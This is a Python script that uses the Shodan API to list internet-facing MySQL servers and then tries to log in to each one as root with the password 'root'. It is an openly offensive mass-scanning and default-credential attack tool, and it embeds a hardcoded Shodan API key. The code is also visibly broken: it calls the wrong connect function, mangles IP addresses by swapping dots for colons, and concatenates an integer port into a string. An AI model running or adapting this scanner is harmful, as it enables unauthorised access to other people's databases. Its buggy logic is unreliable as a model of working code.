from curses import echo
from doctest import script_from_examples
from pprint import pprint

from pydbus import connect
import var_dump
import shodan
import mysql.connector
import time
import sys

#shodan API key
SHODAN_API_KEY = "fD1T4vSYKQaQrtwuGy0Ya4odIOJ1eYs9"
api = shodan.Shodan(SHODAN_API_KEY)

IP = ""
PORT = ""
ORG = ""
COUNTRY = ""

#Weak mysql servers searching
class Exploit:
    def search():
        try:
            for i in range(0, 100):
                print("\r[#]Searching for open mysql servers... " + str(i) + "%", end="")
                time.sleep(0.1)
            print("\r[#]Searching for open mysql servers... 100%")
            time.sleep(1)
            print("\n")
            results = api.search('mysql')
            print('Results found: %s' % results['total'])
            for result in results['matches']:
                print('IP: %s' % result['ip_str'])
                IP = result['ip_str']
                print('Port: %s' % result['port'])
                PORT = result['port']                
                print('Organization: %s' % result['org'])
                ORG = result['org']
                print('Country: %s' % result['location']['country_name'])
                COUNTRY = result['location']['country_name']
                print('\n')
                connect(IP, PORT, ORG, COUNTRY)
        except shodan.APIError as e:
            print('Error: %s' % e)



    def connect(IP, PORT, ORG, COUNTRY):
        IP = IP.replace(".", ":")
        try:
            print ("[#]Connecting to " + IP + ":" + PORT)
            time.sleep(3)
            mydb = mysql.connector.connect(
                host=IP,
                port=PORT,
                user='root',
                passwd='root'
            )
            print("Connected to: " + IP)
            print("Port: " + str(PORT))
            print("Version: " + mydb
            .get_server_info())
            print("\n")
        except mysql.connector.Error as err:
            print("one error of so many fucking errors: {}".format(err))
        pass        

Exploit.search()
    # var_dump.var_dump(IP, PORT)
    # connect(IP, PORT, ORG, COUNTRY)
    # connect(IP, PORT, ORG, COUNTRY)
